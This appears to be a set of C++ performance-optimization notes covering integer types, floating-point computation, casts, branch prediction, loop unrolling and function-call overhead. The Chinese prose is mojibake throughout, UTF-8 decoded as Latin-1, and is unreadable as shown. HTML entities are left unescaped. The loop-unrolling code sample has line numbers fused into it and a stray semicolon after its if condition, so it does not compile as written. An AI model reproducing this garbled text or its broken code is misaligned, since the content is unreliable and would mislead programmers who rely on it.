æ•´æ•°å¤§å° å¯¹äºä¸åŒçš„å¹³å°ï¼Œä¸åŒæ•´æ•°ç±»å‹(char/short/int/long)çš„å¤§å°å¯èƒ½ä¸åŒã€‚ æ— è®ºå¤§å°å¦‚ä½•ï¼Œæ•´æ•°è¿ç®—åŸºæœ¬éƒ½å¾ˆå¿«ï¼Œé™¤éä½¿ç”¨äº†å¤§äºCPUå¯„å­˜å™¨å¤§å°çš„ç±»å‹ï¼Œæ¯”å¦‚åœ¨32ä½ç³»ç»Ÿä¸­ä½¿ç”¨64ä½æ•´æ•°ã€‚ å»ºè®®åœ¨ä¸å¤§å°æ— å…³ä¸”æ²¡æœ‰æº¢å‡ºé£é™©çš„æƒ…å†µä¸‹ä½¿ç”¨é»˜è®¤æ•´æ•°å¤§å°ï¼Œä¾‹å¦‚ç®€å•å˜é‡ã€å¾ªç¯è®¡æ•°å™¨ç­‰ã€‚ åœ¨å¤§å‹æ•°ç»„ä¸­ï¼Œä¸ºäº†æ›´å¥½åœ°ä½¿ç”¨æ•°æ®ç¼“å­˜ï¼Œæœ€å¥½ä½¿ç”¨è¶³å¤Ÿå¤§çš„æœ€å°æ•´æ•°å¤§å°ã€‚ æ— ç¬¦å·æ•´å½¢æ•° vs. æœ‰ç¬¦å·æ•´å½¢æ•° åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä½¿ç”¨æœ‰ç¬¦å·æ•´æ•°å’Œæ— ç¬¦å·æ•´æ•°åœ¨é€Ÿåº¦ä¸Šæ²¡æœ‰åŒºåˆ«ã€‚ é™¤äº† é™¤ä»¥å¸¸æ•°ï¼šå½“ä½ å°†ä¸€ä¸ªæ•´æ•°é™¤ä»¥ä¸€ä¸ªå¸¸æ•°æ—¶ï¼Œæ— ç¬¦å·è¦å¿«äºæœ‰ç¬¦å· å¯¹äºå¤§å¤šæ•°æŒ‡ä»¤é›†ï¼Œæœ‰ç¬¦å·æ•´æ•°æ¯”æ— ç¬¦å·æ•´æ•°è½¬æ¢æˆæµ®ç‚¹æ•°è¦å¿« æœ‰ç¬¦å·å˜é‡å’Œæ— ç¬¦å·å˜é‡çš„æº¢å‡ºè¡Œä¸ºä¸åŒã€‚ æ•´æ•°è¿ç®—ç¬¦ æ•´æ•°è¿ç®—éå¸¸å¿«ã€‚åŠ å‡å’Œä½æ“ä½œåªéœ€ä¸€ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œä¹˜æ³•éœ€è¦3-4ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œé™¤æ³•éœ€è¦40-80ä¸ªã€‚ è‡ªå¢å’Œè‡ªå‡è¿ç®—ç¬¦ å½“ä»…ç”¨äºé€’å¢æ•´æ•°å˜é‡æ—¶ï¼Œä½¿ç”¨é€’å¢å‰æˆ–é€’å¢åéƒ½æ²¡æœ‰åŒºåˆ«ã€‚ ä¾‹å¦‚ï¼Œfor (i=0; i&lt;n; i++)å’Œfor (i=0; i&lt;n; ++i)æ˜¯ä¸€æ ·çš„ã€‚ ä½†æ˜¯å½“ä½¿ç”¨è¡¨è¾¾å¼çš„ç»“æœæ—¶ï¼Œæ•ˆç‡å¯èƒ½ä¼šæœ‰æ‰€ä¸åŒã€‚ ä¾‹å¦‚ï¼Œx = array[i++] æ¯” x = array[++i] é€Ÿåº¦æ›´å¿«ã€‚å› ä¸ºåœ¨åä¸€ç§æƒ…å†µä¸‹ï¼Œæ•°ç»„å…ƒç´ çš„åœ°å€çš„è®¡ç®—å¿…é¡»ç­‰å¾… i çš„æ–°å€¼ï¼Œè¿™å°†ä½¿ x çš„å¯ç”¨æ€§å»¶è¿Ÿå¤§çº¦ä¸¤ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚BUTï¼Œä¸¤è€…è¡¨è¾¾çš„æ„æ€æ˜¯å®Œå…¨ä¸åŒçš„ã€‚ 3 æµ®ç‚¹è®¡ç®—å’Œè¿ç®—ç¬¦ x86æ¶æ„ä¸­æœ‰ä¸¤ç§æµ®ç‚¹è®¡ç®—æ–¹æ³•ã€‚ åŸå§‹æ–¹æ³•ï¼šä½¿ç”¨8ä¸ªæµ®ç‚¹å¯„å­˜å™¨ç»„æˆå¯„å­˜å™¨æ ˆ(é•¿åŒç²¾åº¦80ä½)ã€‚ ä¼˜ç‚¹ï¼šç²¾åº¦é«˜ï¼Œä¸åŒç²¾åº¦ä¹‹é—´æ— éœ€é¢å¤–è½¬æ¢ï¼Œæœ‰æµ®ç‚¹è®¡ç®—æŒ‡ä»¤å¯ç”¨ï¼› ç¼ºç‚¹ï¼šéš¾ä»¥ç”Ÿæˆå¯„å­˜å™¨å˜é‡ï¼Œæµ®ç‚¹è®¡ç®—è¾ƒæ…¢ï¼Œæ•´æ•°å’Œæµ®ç‚¹æ•°ä¹‹é—´è½¬æ¢æ•ˆç‡å¾ˆä½ å‘é‡æ–¹æ³•ï¼šä½¿ç”¨8ä¸ªæˆ–16ä¸ªå‘é‡å¯„å­˜å™¨(XMMæˆ–YMM)ã€‚ ä¼˜ç‚¹ï¼šå¯å¹¶è¡Œè®¡ç®—ï¼Œå¯„å­˜å™¨å˜é‡å®¹æ˜“å®ç°ï¼› ç¼ºç‚¹ï¼šä¸æ”¯æŒé•¿åŒç²¾åº¦ï¼Œæ•°å­¦å‡½æ•°å¿…é¡»ä½¿ç”¨å‡½æ•°åº“(ä½†é€šå¸¸æ¯”ç¡¬ä»¶æŒ‡ä»¤æ›´å¿«) XMMå‘é‡å¯„å­˜å™¨åœ¨x86_64æ¶æ„ä¸­å¯ç”¨ã€‚å¦‚æœå¤„ç†å™¨å’Œæ“ä½œç³»ç»Ÿæ”¯æŒAVXæŒ‡ä»¤é›†ï¼Œåˆ™å¯ä½¿ç”¨YMMå‘é‡å¯„å­˜å™¨ã€‚å½“XMMå¯ç”¨æ—¶ï¼Œç¼–è¯‘å™¨ä¸€èˆ¬ç”¨å‘é‡æ–¹æ³•è®¡ç®—æµ®ç‚¹æ•°ã€‚ æ ¹æ®å¾®å¤„ç†å™¨çš„ä¸åŒï¼Œæµ®ç‚¹åŠ æ³•éœ€è¦ 3â€6 ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚ä¹˜æ³•éœ€è¦ 4â€8 ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚é™¤æ³•éœ€è¦ 14â€45 ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚ 4 æšä¸¾ æšä¸¾åªæ˜¯éšè—çš„æ•´æ•°ã€‚ 5 å¸ƒå°”å€¼ å¸ƒå°”æ“ä½œæ•°çš„é¡ºåº çŸ­è·¯é€»è¾‘ï¼šå½“ &amp;&amp; çš„å·¦æ“ä½œæ•°ä¸ºfalseæ—¶ï¼Œä¾¿ä¸ä¼šè®¡ç®—å³æ“ä½œæ•°ã€‚åŒç†, || çš„åšæ“ä½œæ•°ä¸ºtrueæ—¶ï¼Œä¹Ÿä¸ä¼šè®¡ç®—å³æ“ä½œæ•°ã€‚å› æ­¤å»ºè®®å°†é€šå¸¸ä¸ºtrueçš„æ“ä½œæ•°æ”¾åœ¨&amp;&amp;è¡¨è¾¾å¼æœ€åï¼Œæˆ–||è¡¨è¾¾å¼çš„å¼€å¤´ã€‚ å¸ƒå°”å˜é‡è¢«è¿‡åº¦æ£€æŸ¥ ç”±äºæ‰€æœ‰ä»¥å¸ƒå°”å˜é‡ä½œä¸ºè¾“å…¥çš„è¿ç®—ç¬¦éƒ½è¦æ£€æŸ¥è¾“å…¥æ˜¯å¦æœ‰é™¤0æˆ–1ä¹‹å¤–çš„å€¼ï¼Œå› æ­¤å¸ƒå°”å˜é‡ä¼šè¢«è¿‡åº¦æ£€æŸ¥ã€‚å¦‚æœçŸ¥é“æ“ä½œæ•°é™¤äº† 0 å°±æ˜¯ 1ï¼Œå¸ƒå°”è¿ç®—å¯ä»¥å˜å¾—æœ‰æ•ˆç‡çš„å¤šã€‚ ç¼–è¯‘å™¨ä¹‹æ‰€ä»¥ä¸è¿™æ ·å‡è®¾ï¼Œæ˜¯å› ä¸ºå˜é‡å¯èƒ½æ˜¯æ²¡æœ‰è¢«åˆå§‹åŒ–çš„æˆ–è€…æ˜¯æ¥è‡ªå…¶å®ƒæœªçŸ¥æ¥æºçš„ã€‚ å¸ƒå°”å‘é‡æ“ä½œ ä¸€ä¸ªæ•´æ•°å¯è¢«å½“åšå¸ƒå°”å‘é‡æ“ä½œã€‚ä¾‹å¦‚ bitmap 6 æŒ‡é’ˆå’Œå¼•ç”¨ æŒ‡é’ˆ vs. å¼•ç”¨ æŒ‡é’ˆå’Œå¼•ç”¨çš„æ•ˆç‡æ˜¯ä¸€æ ·çš„ï¼Œå› ä¸ºå®ƒä»¬å®é™…ä¸Šåšçš„äº‹æƒ…æ˜¯ç›¸åŒçš„ï¼ŒåŒºåˆ«åœ¨äºç¼–ç¨‹é£æ ¼ã€‚ æŒ‡é’ˆçš„ä¼˜ç‚¹ï¼šåŠŸèƒ½ä¸Šæ›´çµæ´»ï¼Œå¯ä»¥åšæŒ‡é’ˆè®¡ç®—(ä¾‹å¦‚è®¿é—®ç¼“å†²åŒº)ï¼Œå½“ç„¶ä¹Ÿæ›´å®¹æ˜“å‡ºé”™ å¼•ç”¨çš„ä¼˜ç‚¹ï¼šè¯­æ³•æ›´ç®€å•ï¼Œä¹Ÿæ›´å®‰å…¨ã€‚ æ•ˆç‡ è¿è¡Œæ—¶ï¼Œéœ€è¦ä¸€ä¸ªé¢å¤–çš„å¯„å­˜å™¨æ¥ä¿å­˜æŒ‡é’ˆæˆ–å¼•ç”¨çš„å€¼ï¼Œè€Œå¯„å­˜å™¨æ˜¯ä¸€ç§ç¨€ç¼ºèµ„æºï¼Œå¦‚æœæ²¡æœ‰è¶³å¤Ÿçš„å¯„å­˜å™¨ï¼Œé‚£ä¹ˆæŒ‡é’ˆæ¯æ¬¡ä½¿ç”¨æ—¶éƒ½å¿…é¡»ä»å†…å­˜ä¸­åŠ è½½ï¼Œè¿™ä¼šä½¿ç¨‹åºå˜æ…¢ã€‚ å¦ä¸€ä¸ªç¼ºç‚¹æ˜¯æŒ‡é’ˆçš„å€¼éœ€è¦å‡ ä¸ªæ—¶é’Ÿå‘¨æœŸæ‰èƒ½è®¿é—®æ‰€æŒ‡å‘çš„å˜é‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¦è¯»å–æŒ‡é’ˆæˆ–å¼•ç”¨çš„å€¼ï¼Œæœ€åæƒ…å†µä¸‹éœ€è¦è®¿é—®ä¸¤æ¬¡å†…å­˜ã€‚ å‡½æ•°æŒ‡é’ˆ é€šè¿‡å‡½æ•°æŒ‡é’ˆè°ƒç”¨å‡½æ•°é€šå¸¸è¦æ¯”ç›´æ¥è°ƒç”¨å‡½æ•°å¤šèŠ±å‡ ä¸ªæ—¶é’Ÿå‘¨æœŸ ã€‚ æ™ºèƒ½æŒ‡é’ˆ ä½¿ç”¨æ™ºèƒ½æŒ‡é’ˆçš„ç›®çš„æ˜¯ä¸ºäº†ç¡®ä¿å¯¹è±¡è¢«æ­£ç¡®åˆ é™¤ï¼Œä»¥åŠåœ¨å¯¹è±¡ä¸å†ä½¿ç”¨æ—¶é‡Šæ”¾å†…å­˜ ã€‚ é€šè¿‡æ™ºèƒ½æŒ‡é’ˆè®¿é—®å¯¹è±¡æ²¡æœ‰é¢å¤–çš„æˆæœ¬ã€‚ ä½†æ˜¯ï¼Œæ¯å½“åˆ›å»ºã€åˆ é™¤ã€å¤åˆ¶æˆ–ä»ä¸€ä¸ªå‡½æ•°è½¬ç§»åˆ°å¦ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œéƒ½ä¼šäº§ç”Ÿé¢å¤–çš„æˆæœ¬ã€‚shared_ptr çš„è¿™äº›æˆæœ¬è¦é«˜äº unique_ptrã€‚ 7 æ•°ç»„ æ•°ç»„æ˜¯é€šè¿‡åœ¨å†…å­˜ä¸­è¿ç»­å­˜å‚¨å…ƒç´ æ¥å®ç°çš„ï¼Œæ²¡æœ‰å­˜å‚¨å…³äºæ•°ç»„å¤§å°çš„ä¿¡æ¯ã€‚å› æ­¤c/c++ä¸­æ•°ç»„ç›¸æ¯”å…¶ä»–è¯­è¨€æ›´å¿«ï¼Œä½†ä¹Ÿæ›´ä¸å®‰å…¨ã€‚ å½“ä¸æŒ‰é¡ºåºç´¢å¼•æ—¶ï¼Œä¸ºäº†ä½¿åœ°å€çš„è®¡ç®—æ›´é«˜æ•ˆï¼Œé‚£ä¹ˆé™¤äº†ç¬¬ä¸€ä¸ªç»´åº¦å¤–ï¼Œæ‰€æœ‰ç»´åº¦çš„å¤§å°æœ€å¥½æ˜¯ 2 çš„å¹‚ã€‚å½“ä»¥éé¡ºåºè®¿é—®å…ƒç´ ï¼Œåˆ™å¯¹è±¡çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰æœ€å¥½ä¸º 2 çš„å¹‚ã€‚ ä¸Šè¿°å»ºè®®æ˜¯ä¸ºäº†æ›´å¥½åˆ©ç”¨CPUçš„data cacheã€‚ 8 ç±»å‹è½¬æ¢ signed/unsignedè½¬æ¢ å¯„å­˜å™¨å€¼ä¸å˜ï¼Œåªæ˜¯ç¼–è¯‘å™¨æ¢äº†è§£é‡Šæ–¹æ³•ã€‚å› æ­¤æ²¡æœ‰é¢å¤–çš„æ€§èƒ½æˆæœ¬ã€‚ æ•´å½¢ç±»å‹å¤§å°çš„è½¬æ¢ ç±»å‹å¤§å°è½¬æ¢é€šå¸¸ä¸éœ€è¦é¢å¤–çš„æ—¶é—´ æµ®ç‚¹è¿›åº¦è½¬æ¢ å½“ä½¿ç”¨æµ®ç‚¹å¯„å­˜å™¨æ—¶ï¼Œæµ®ç‚¹ã€åŒç²¾åº¦å’Œé•¿åŒç²¾åº¦ä¹‹é—´çš„è½¬æ¢ä¸éœ€è¦é¢å¤–çš„æ—¶é—´ å½“ç”¨XMMå¯„å­˜å™¨æ—¶ï¼Œéœ€è¦ 2 åˆ° 15ä¸ªæ—¶é’Ÿå‘¨æœŸï¼ˆå–å†³äºå¤„ç†å™¨ï¼‰ å› æ­¤å»ºè®®ä½¿ç”¨å‘é‡åŒ–å¯„å­˜å™¨å­˜å‚¨æµ®ç‚¹æ•°æ—¶ï¼Œä¸è¦æ··ç”¨æµ®ç‚¹ç±»å‹ã€‚ æ•´å½¢è½¬æµ®ç‚¹å‹ å°†æœ‰ç¬¦å·æ•´æ•°è½¬æ¢ä¸ºæµ®ç‚¹æ•°æˆ–åŒç²¾åº¦æµ®ç‚¹æ•°éœ€è¦ 4â€16ä¸ªæ—¶é’Ÿå‘¨æœŸï¼Œè¿™å–å†³äºå¤„ç†å™¨å’Œä½¿ç”¨çš„å¯„å­˜å™¨ç±»å‹ã€‚æ— ç¬¦å·æ•´æ•°çš„è½¬æ¢éœ€è¦æ›´é•¿çš„æ—¶é—´ã€‚ å¦‚æœæ²¡æœ‰æº¢å‡ºçš„é£é™©ï¼Œé¦–å…ˆå°†æ— ç¬¦å·æ•´æ•°è½¬æ¢ä¸ºæœ‰ç¬¦å·æ•´æ•°ä¼šæ›´å¿«ã€‚ æµ®ç‚¹å‹è½¬åŒ–ä¸ºæ•´å½¢ å¦‚æœä¸å¯ç”¨ SSE2 æˆ–è€…æ›´æ–°çš„æŒ‡ä»¤é›†ï¼Œæµ®ç‚¹æ•°åˆ°æ•´æ•°çš„è½¬æ¢å°†èŠ±è´¹å¾ˆé•¿çš„æ—¶é—´ã€‚é€šå¸¸ï¼Œè½¬æ¢éœ€è¦ 50â€100 ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚ è§£å†³æ–¹æ¡ˆæ˜¯ï¼š ä½¿ç”¨ 64 ä½æ¨¡å¼æˆ–å¯ç”¨ SSE2 æŒ‡ä»¤é›†ï¼› ä½¿ç”¨å››èˆäº”å…¥ä»£æ›¿æˆªæ–­ï¼Œå¹¶ç”¨æ±‡ç¼–è¯­è¨€åˆ¶ä½œä¸€ä¸ªèˆå…¥å‡½æ•°ã€‚ æŒ‡é’ˆç±»å‹è½¬æ¢ æŒ‡é’ˆå¯ä»¥è½¬æ¢ä¸ºå¦ä¸€ç§ç±»å‹çš„æŒ‡é’ˆã€‚åŒæ ·ï¼Œå¯ä»¥å°†æŒ‡é’ˆè½¬æ¢ä¸ºæ•´æ•°ï¼Œä¹Ÿå¯ä»¥å°†æ•´æ•°è½¬æ¢ä¸ºæŒ‡é’ˆã€‚å€¼è¿˜æ˜¯é‚£äº›å€¼ï¼Œåªæ˜¯æ¢äº†ç§è§£é‡Šæ–¹æ³•ï¼Œå› æ­¤æ²¡æœ‰ä»»ä½•å¼€é”€ã€‚ é‡æ–°è§£é‡Šå¯¹è±¡ c++ä¸­çš„reinterpret_castï¼Œæ²¡æœ‰ä»»ä½•é¢å¤–å¼€é”€ã€‚ const_cast const_cast è¿ç®—ç¬¦ç”¨äºè§£é™¤ const å¯¹æŒ‡é’ˆçš„é™åˆ¶ ã€‚ æ²¡æœ‰ä»»ä½•é¢å¤–å¼€é”€ã€‚ static_cast static_cast è¿ç®—ç¬¦çš„ä½œç”¨ä¸ C é£æ ¼çš„ç±»å‹è½¬æ¢ç›¸åŒã€‚ä¾‹å¦‚ï¼Œå®ƒç”¨äºå°† float è½¬æ¢ä¸º int reinterpret_cast æ²¡æœ‰ä»»ä½•é¢å¤–å¼€é”€ã€‚ dynamic_cast dynamic_cast è¿ç®—ç¬¦ç”¨äºå°†æŒ‡å‘ä¸€ä¸ªç±»çš„æŒ‡é’ˆè½¬æ¢ä¸ºæŒ‡å‘å¦ä¸€ä¸ªç±»çš„æŒ‡é’ˆã€‚å®ƒåœ¨è¿è¡Œæ—¶æ£€æŸ¥è½¬æ¢æ˜¯å¦æœ‰æ•ˆ ã€‚dynamic_castæ¯”static_castæ›´è€—æ—¶ï¼Œä¹Ÿæ›´å®‰å…¨ã€‚ è½¬æ¢ç±»å¯¹è±¡ åªæœ‰å½“ç¨‹åºå‘˜å®šä¹‰äº†æ„é€ å‡½æ•°ã€é‡è½½èµ‹å€¼è¿ç®—ç¬¦æˆ–é‡è½½ç±»å‹è½¬æ¢è¿ç®—ç¬¦ï¼ˆæŒ‡å®šå¦‚ä½•è¿›è¡Œè½¬æ¢ï¼‰æ—¶ï¼Œæ‰æœ‰å¯èƒ½è¿›è¡Œæ¶‰åŠç±»å¯¹è±¡ï¼ˆè€Œä¸æ˜¯æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆï¼‰çš„è½¬æ¢ã€‚ æ„é€ å‡½æ•°æˆ–é‡è½½è¿ç®—ç¬¦ä¸æˆå‘˜å‡½æ•°çš„æ•ˆç‡æ˜¯ä¸€æ ·çš„ã€‚ 9 åˆ†æ”¯å’Œswitchè¯­å¥ åœ¨å¾®å¤„ç†å™¨åšå‡ºæ­£ç¡®åˆ†æ”¯é¢„æµ‹çš„æƒ…å†µä¸‹ï¼Œæ‰§è¡Œåˆ†æ”¯æŒ‡ä»¤é€šå¸¸éœ€è¦ 0â€2 ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚æ ¹æ®å¤„ç†å™¨çš„ä¸åŒï¼Œä»åˆ†æ”¯é”™è¯¯é¢„æµ‹ä¸­æ¢å¤æ‰€éœ€çš„æ—¶é—´å¤§çº¦ä¸º 12â€25 ä¸ªæ—¶é’Ÿå‘¨æœŸã€‚è¿™è¢«ç§°ä¸ºåˆ†æ”¯é¢„æµ‹é”™è¯¯çš„æƒ©ç½šã€‚ for å¾ªç¯æˆ– while å¾ªç¯ä¹Ÿæ˜¯ä¸€ç§åˆ†æ”¯ã€‚ åœ¨æ¯æ¬¡è¿­ä»£ä¹‹åï¼Œå®ƒå†³å®šæ˜¯é‡å¤è¿˜æ˜¯é€€å‡ºå¾ªç¯ã€‚åµŒå¥—å¾ªç¯åªèƒ½åœ¨æŸäº›å¤„ç†å™¨ä¸Šå¾—åˆ°å¾ˆå¥½çš„é¢„æµ‹ã€‚åœ¨è®¸å¤šå¤„ç†å™¨ä¸Šï¼ŒåŒ…å«å¤šä¸ªåˆ†æ”¯çš„å¾ªç¯å¹¶ä¸èƒ½å¾ˆå¥½åœ°è¢«é¢„æµ‹ã€‚ switch è¯­å¥ä¹Ÿæ˜¯ä¸€ç§åˆ†æ”¯ï¼Œå®ƒå¯ä»¥æœ‰ä¸¤ä¸ªä»¥ä¸Šçš„åˆ†æ”¯ã€‚ å¦‚æœ case æ ‡ç­¾æ˜¯éµå¾ªæ¯ä¸ªæ ‡ç­¾ç­‰äºå‰ä¸€ä¸ªæ ‡ç­¾åŠ  1 çš„åºåˆ—ï¼Œåœ¨è¿™ä¸ªæ—¶å€™ switchè¯­å¥çš„æ•ˆç‡æ˜¯æœ€é«˜çš„ï¼Œå› ä¸ºå®ƒå¯ä»¥è¢«å®ç°ä¸ºä¸€ä¸ªç›®æ ‡è·³è½¬è¡¨ã€‚ å¦‚æœ switch å¸¦æœ‰è®¸å¤šæ ‡ç­¾å€¼ï¼Œå¹¶ä¸”å½¼æ­¤ç›¸å·®è¾ƒå¤§ï¼Œè¿™å°†æ˜¯ä½æ•ˆçš„ï¼Œå› ä¸ºç¼–è¯‘å™¨å¿…é¡»å°†å…¶è½¬æ¢æˆä¸€ä¸ªåˆ†æ”¯æ ‘ã€‚ åˆ†æ”¯å’Œ switch è¯­å¥çš„æ•°é‡ï¼Œåœ¨ç¨‹åºçš„å…³é”®éƒ¨åˆ†ï¼Œæœ€å¥½æ§åˆ¶åœ¨è¾ƒå°‘çš„æ°´å¹³ ã€‚ å› ä¸ºåˆ†æ”¯å’Œå‡½æ•°è°ƒç”¨çš„ç›®æ ‡ä¿å­˜åœ¨ç§°ä¸ºåˆ†æ”¯ç›®æ ‡ç¼“å†²åŒºçš„ç‰¹æ®Šç¼“å­˜ä¸­ã€‚å¦‚æœä¸€ä¸ªç¨‹åºä¸­æœ‰è®¸å¤šåˆ†æ”¯æˆ–å‡½æ•°è°ƒç”¨ï¼Œé‚£ä¹ˆåœ¨åˆ†æ”¯ç›®æ ‡ç¼“å†²åŒºä¸­å°±å¯èƒ½äº§ç”Ÿç«äº‰ã€‚è¿™ç§ç«äº‰çš„ç»“æœæ˜¯ï¼Œå³ä½¿åˆ†æ”¯å…·æœ‰è‰¯å¥½çš„å¯é¢„æµ‹æ€§ï¼Œå®ƒä»¬ä¹Ÿå¯èƒ½è¢«é”™è¯¯åœ°é¢„æµ‹ã€‚ 10 å¾ªç¯ å¾ªç¯çš„æ•ˆç‡å–å†³äºå¾®å¤„ç†å™¨å¯¹å¾ªç¯æ§åˆ¶åˆ†æ”¯çš„é¢„æµ‹èƒ½åŠ›ã€‚ ä¸€ä¸ªè¾ƒå°å¹¶ä¸”æœ‰å›ºå®šçš„é‡å¤è®¡æ•°ï¼Œä¸”æ²¡æœ‰åˆ†æ”¯çš„å¾ªç¯ï¼Œå¯ä»¥å®Œç¾åœ°è¢«é¢„æµ‹ã€‚ å¾ªç¯å±•å¼€ å±•å¼€å‰ 123456789int i;for (i &#x3D; 0; i &lt; 20; i++)&#123; if (i % 2 &#x3D;&#x3D; 0); FuncA(i); else FuncB(i); FuncC(i);&#125; å±•å¼€å 12345678int i;for (i &#x3D; 0; i &lt; 20; i+&#x3D;2)&#123; FuncA(i); FuncC(i); FuncB(i+1); FuncC(i+1);&#125; è¿™æ ·åšçš„å¥½å¤„ï¼š å¾ªç¯æ¬¡æ•°å˜æˆäº†10æ¬¡è€Œä¸æ˜¯20æ¬¡ï¼ŒCPUå¯ä»¥æ›´å®Œç¾çš„è¿›è¡Œé¢„æµ‹ ifåˆ†æ”¯è¢«æ¶ˆé™¤ï¼Œæœ‰åˆ©äºç¼–è¯‘å™¨è‡ªåŠ¨è¿›è¡Œå‘é‡åŒ–ç­‰ä¼˜åŒ– å¾ªç¯å±•å¼€çš„åå¤„ï¼š å±•å¼€å¾ªç¯ååœ¨ä»£ç ç¼“å­˜ä¸­å ç”¨æ›´å¤šç©ºé—´ éå¸¸å°çš„å¾ªç¯å±•å¼€ä¸å¦‚ä¸å±•å¼€ å¦‚æœé‡å¤è®¡æ•°ä¸ºå¥‡æ•°ï¼Œå¹¶å°†å…¶å±•å¼€ä¸º2ï¼Œ åˆ™å¿…é¡»åœ¨å¾ªç¯ä¹‹å¤–æ‰§è¡Œé¢å¤–çš„è¿­ä»£ã€‚ åªæœ‰åœ¨èƒ½å¤Ÿå–å¾—ç‰¹å®šå¥½å¤„çš„æƒ…å†µä¸‹ï¼Œæ‰åº”è¯¥ä½¿ç”¨å¾ªç¯å±•å¼€ã€‚ æ¯”å¦‚ï¼Œå¦‚æœä¸€ä¸ªå¾ªç¯åŒ…å«æµ®ç‚¹è¿ç®—ï¼Œä¸”å¾ªç¯è®¡æ•°å™¨æ˜¯æ•´æ•°ï¼Œé‚£ä¹ˆé€šå¸¸å¯ä»¥å‡è®¾æ•´ä¸ªè®¡ç®—æ—¶é—´æ˜¯ç”±æµ®ç‚¹ä»£ç å†³å®šçš„ï¼Œè€Œä¸æ˜¯ç”±å¾ªç¯æ§åˆ¶åˆ†æ”¯å†³å®šçš„ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå±•å¼€å¾ªç¯æ˜¯æ²¡æœ‰ä»»ä½•å¥½å¤„çš„ ã€‚ å¾ªç¯æ§åˆ¶æ¡ä»¶ å¦‚æœå¾ªç¯æ§åˆ¶åˆ†æ”¯ä¾èµ–äºå¾ªç¯å†…éƒ¨çš„è®¡ç®—ï¼Œåˆ™æ•ˆç‡è¾ƒä½ã€‚ ç¡®å®šæœ€åæƒ…å†µä¸‹çš„æœ€å¤§é‡å¤è®¡æ•°å¹¶å§‹ç»ˆä½¿ç”¨æ­¤è¿­ä»£æ¬¡æ•°çš„æ•ˆç‡ä¼šæ›´é«˜ã€‚ å¾ªç¯è®¡æ•°å™¨æœ€å¥½æ˜¯æ•´æ•°ã€‚ å¤åˆ¶æˆ–æ¸…é™¤æ•°ç»„ å¯¹äºè¯¸å¦‚å¤åˆ¶æ•°ç»„æˆ–å°†æ•°ç»„ä¸­çš„å…ƒç´ å…¨éƒ¨è®¾ç½®ä¸ºé›¶è¿™æ ·çš„çç¢ä»»åŠ¡ï¼Œä½¿ç”¨å¾ªç¯å¯èƒ½ä¸æ˜¯æœ€ä½³é€‰æ‹©ã€‚ ä½¿ç”¨ memset å’Œ memcpy å‡½æ•°é€šå¸¸ä¼šæ›´å¿«ã€‚ 11 å‡½æ•° å‡½æ•°è°ƒç”¨ä¼šè®©ç¨‹åºæ…¢ä¸‹æ¥ï¼Œå› ä¸º ä»£ç åœ°å€è·³è½¬ï¼Œå¯èƒ½éœ€è¦4ä¸ªæ—¶é’Ÿå‘¨æœŸ å¦‚æœä»£ç åˆ†æ•£åœ¨å†…å­˜ä¸­ä¼šé™ä½ä»£ç ç¼“å­˜æ•ˆç‡ å¦‚æœå‡½æ•°å‚æ•°ä¸å¤Ÿæ”¾åœ¨å¯„å­˜å™¨ä¸­ï¼Œéœ€è¦å…¥åˆ°æ ˆä¸­ï¼Œæ•ˆç‡ä¸é«˜ éœ€è¦é¢å¤–æ—¶é—´è®¾ç½®stack frame, ä¿å­˜å’Œæ¢å¤å¯„å­˜å™¨ æ¯ä¸ªå‡½æ•°è°ƒç”¨è¯­å¥éœ€è¦åœ¨åˆ†æ”¯ç›®æ ‡ç¼“å†²åŒºï¼ˆBTBï¼‰ä¸­å ç”¨ç©ºé—´ï¼ŒBTBä¸­å‘ç”Ÿèµ„æºç«äº‰å¯èƒ½ä¼šå¯¼è‡´åˆ†æ”¯é¢„æµ‹å¤±è´¥ã€‚ å¦‚ä½•é¿å…å‡½æ•°è°ƒç”¨é™ä½æ•ˆç‡å‘¢ï¼Ÿ é¿å…ä¸å¿…è¦å‡½æ•° ä¸è¦è¿‡åº¦å°è£…ã€‚ ä½¿ç”¨å†…è”å‡½æ•° å¦‚æœå‡½æ•°å¾ˆå°ï¼Œæˆ–è€…åªåœ¨ç¨‹åºä¸­çš„ä¸€ä¸ªä½ç½®è°ƒç”¨å®ƒï¼Œé‚£ä¹ˆå†…è”å‡½æ•°æ˜¯æœ‰å¥½å¤„çš„ã€‚å°å‡½æ•°é€šå¸¸ç”±ç¼–è¯‘å™¨è‡ªåŠ¨å†…è”ã€‚ é¿å…åœ¨æœ€å†…å±‚å¾ªç¯åµŒå¥—å‡½æ•°è°ƒç”¨ å¦‚æœåœ¨ç¨‹åºå…³é”®çš„æœ€å†…å±‚å¾ªç¯åŒ…å«å¯¹å¸§å‡½æ•°çš„è°ƒç”¨ï¼Œé‚£ä¹ˆä»£ç æœ‰å¯èƒ½é€šè¿‡å†…è”å¸§å‡½æ•°æˆ–ä½¿å¸§å‡½æ•°è°ƒç”¨çš„æ‰€æœ‰å‡½æ•°å†…è”ï¼ˆæŠŠå¸§å‡½æ•°å˜ä¸ºå¶å‡½æ•°ï¼‰æ¥æå‡æ•ˆç‡ã€‚ å¸§å‡½æ•°ï¼ˆFrame Functionï¼‰ï¼š å¸§å‡½æ•°æ˜¯æŒ‡åœ¨ç¨‹åºæ‰§è¡ŒæœŸé—´åˆ›å»ºçš„å‡½æ•°è°ƒç”¨å¸§ï¼ˆFunction Frameï¼‰æˆ–æ ˆå¸§ï¼ˆStack Frameï¼‰ã€‚æ¯å½“å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œä¼šåœ¨å†…å­˜ä¸­åˆ†é…ä¸€ä¸ªå¸§æ¥å­˜å‚¨å‡½æ•°çš„å±€éƒ¨å˜é‡ã€å‚æ•°å’Œå…¶ä»–ç›¸å…³ä¿¡æ¯ã€‚ 